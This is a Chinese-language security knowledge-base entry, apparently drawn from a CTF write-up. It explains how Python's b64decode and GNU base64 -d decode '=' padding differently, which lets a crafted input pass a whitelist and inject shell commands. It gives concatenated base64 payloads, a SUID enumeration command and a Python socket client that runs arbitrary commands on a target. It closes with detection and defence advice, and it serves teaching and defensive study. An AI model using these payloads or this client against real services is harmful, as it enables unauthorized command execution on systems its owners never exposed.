---
id: web-python-base64-padding-parser-differential-command-injection
title: Base64 解码服务解析差异：Python b64decode 在 `=` 处截断绕过白名单，shell base64 拼接后执行命令
type: scenario
domain: web
path: web/python
technique: base64-padding-parser-differential-command-injection
aliases:
- base64 解析差异绕过
- Python b64decode 截断
- shell base64 拼接解码
- base64 白名单绕过命令注入
- MTIzNDU2Cg==bHMgLWxh
tags:
- python
- base64
- parser-differential
- command-injection
- filter-bypass
- rce
- python-base64
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:13:14+08:00'
  notes: 已对照原文与图 55-57 核对：Python b64decode 在 = 截断、shell base64 -d 继续解码、re.match(r'^\w+$') 放行末尾换行、tmpfile+sh 执行一致；本地复算 MTIzNDU2Cg==bHMgLWxh 两实现差异；未复跑靶场。
---

## 一句话结论

服务端用 Python `base64.b64decode` 解码并校验，再用系统 `base64 -d` 对原始输入做“真正”解码时，两套实现对待 `=` 填充的语义不同：Python 在第一个 `=` 处停止，只看得到校验通过的前半段；GNU `base64 -d` 会把中间的 `=` 当作填充并继续解码后续字符串。把 `base64("123456\n")` 与 `base64("ls -la")` 直接拼接发送，前半段通过 `^\w+$`（Python `$` 允许末尾换行），后半段在 shell 解码后变成第二行命令被执行，从而绕过“只允许字母数字下划线”的限制实现命令注入。

## 原理

- **两套 Base64 实现的差异**：
  - Python `base64.b64decode(s)` 基于 `binascii.a2b_base64`，遇到 `=` 填充后停止处理，忽略其后的字符；因此 `MTIzNDU2Cg==bHMgLWxh` 解出的是 `123456\n`。
  - GNU coreutils `base64 -d`（以及多数 shell 工具）把 `=` 视为填充，去掉后继续解码后续的有效字符，相当于把两个 Base64 流拼接起来；同一个输入会解出 `123456\nls -la`。
- **校验为何被绕过**：服务端校验的是 Python 解码结果，正则为 `^\w+$`。Python 的 `$` 默认匹配字符串末尾或末尾换行符之前，所以 `123456\n` 能匹配（`\w+` 只消费 `123456`，`$` 在 `\n` 前成立）。若使用 `fullmatch` 或 `\Z`，末尾换行会被拒绝。
- **命令为何会被执行**：应用把原始输入写入临时文件，再调用 shell 的 `base64 -d tmpfile` 并把结果交由 `sh` 执行/求值。于是 Python 校验过的“良性”输入与 shell 解码出的“恶意第二行”不一致，形成典型的解析器差异（parser differential）漏洞。
- **为什么用 `echo` 构造两段**：`echo "123456"` 默认追加换行，所以 6 个字符编码后必然出现 `==` 填充；`echo -n "ls -la"` 不加换行，第二段编码后无填充。两段直接拼接即可：`MTIzNDU2Cg==` + `bHMgLWxh`。
- **前提**：应用必须“先校验、后按另一套实现解码/执行”，且执行环节使用 shell；如果只解码一次、或用同一实现、或把解码结果当参数而非命令，则无法利用。

## 触发条件

- Python 服务接收 Base64 输入，使用 `base64.b64decode` 做白名单校验（如 `re.match(r'^\w+$', data)`）。
- 实际解码/执行业务使用系统 `base64 -d` 或另一套允许中间填充的实现，且结果进入 shell/`eval`/命令拼接。
- 输入原串被原样写入临时文件或再次传入 shell，而不是只传递第一次解码后的字节。
- 服务以可执行命令的权限运行（容器内常为 root 或服务账户），从而造成命令执行。

## 利用步骤

1. 观察服务返回：正常输入会被 `base64 -d` 解码并回显；尝试带 `=` 的拼接输入，确认 Python 校验只看到前半段。
2. 构造第一段：`echo "123456" | base64` → `MTIzNDU2Cg==`，其 Python 解码结果为 `123456\n`，可通过 `^\w+$`。
3. 构造第二段：`echo -n "id" | base64` → `aWQ=`（或任意命令，如 `ls -la`、`cat /flag`）。
4. 拼接发送：`MTIzNDU2Cg==aWQ=`。Python 解码停在第一个 `==`，校验通过；shell `base64 -d` 解出两行，第二行被 `sh` 执行。
5. 若回显被包裹在固定前缀中，按前缀截取命令输出；需要交互时用 socket 客户端循环发送命令。
6. 若目标是 CTF 容器，进一步枚举 SUID 程序（如 `find / -perm -u=s -type f 2>/dev/null`）提权读取 flag。

## PoC

```bash
echo "123456" | base64          # MTIzNDU2Cg==
echo -n "ls -la" | base64       # bHMgLWxh

# 发送拼接串（服务端 Python 校验看到 "123456\n"，shell 解码得到两行）
# > MTIzNDU2Cg==bHMgLWxh
# base64-decoded data: 123456
# total 16
# drwxrwxrwx 1 root root 4096 ...
```

```python
import base64, socket

HOST, PORT = "target", 1337
PREFIX = b"MTIzNDU2Cg=="          # base64("123456\n")，用于通过 Python 校验

def run(cmd):
    payload = PREFIX + base64.b64encode(cmd.encode())
    s = socket.create_connection((HOST, PORT))
    s.recv(4096)
    s.sendall(payload + b"\n")
    data = b""
    while b"> " not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    return data.decode(errors="replace")

print(run("id"))
```

说明：PoC 为原文流程的最小化复现，未在本机执行；原文在靶场上发送 `MTIzNDU2Cg==bHMgLWxh` 后看到了 `ls -la` 的输出，随后用 SUID `dd` 读取 `/flag`。

## 变体与关联

- 变体（解析器）：Python `b64decode` vs GNU `base64 -d`、URL 解码 vs 表单解码、JSON 解析器差异、Unicode 规范化差异；核心都是“校验用一套、执行用另一套”。
- 变体（绕过点）：`re.match` vs `re.fullmatch`/`\Z`、末尾换行、NUL、超长输入、非法字符忽略策略（`validate=False`）。
- 变体（执行点）：`os.popen("... | sh")`、`subprocess.run(..., shell=True)`、`eval`/`exec` 解码结果；即使没有 shell，若解码结果被拼进另一条命令也会触发。
- 关联：[[web-python-django-login-eval-base64-user-input-rce]]（Python 应用把 Base64 用户输入交给 eval）；[[web-python-waf-bypass-encoding-unicode-normalization]]（编码/规范化差异绕过）；[[pentest-privilege-escalation-suid-file-io-root-file-access]]（SUID 文件读取提权）；[[pentest-privilege-escalation-suid-gtfobins-shell-escape]]（SUID gtfobins）。
- 边界：服务只解码一次、使用同一库、校验后只把解码字节当数据、或没有 shell 执行环节时，该链不成立。

## 检测与防御

- 检测：同一请求中出现多个 Base64 段拼接、`=` 出现在字符串中间；Python 解码结果与 shell 解码结果不一致；服务进程执行 `base64 -d` 后紧接 `sh`/`bash`；命令输出异常回显。
- 防御：只解码一次，使用 `base64.b64decode(validate=True)`，并用 `re.fullmatch(r'[A-Za-z0-9_]+', data)` 或 `\Z` 严格校验；禁止把用户输入写入临时文件后再交给 shell；用参数数组（`subprocess.run([...], shell=False)`）替代字符串拼接；最小权限运行，移除不必要的 SUID 程序。
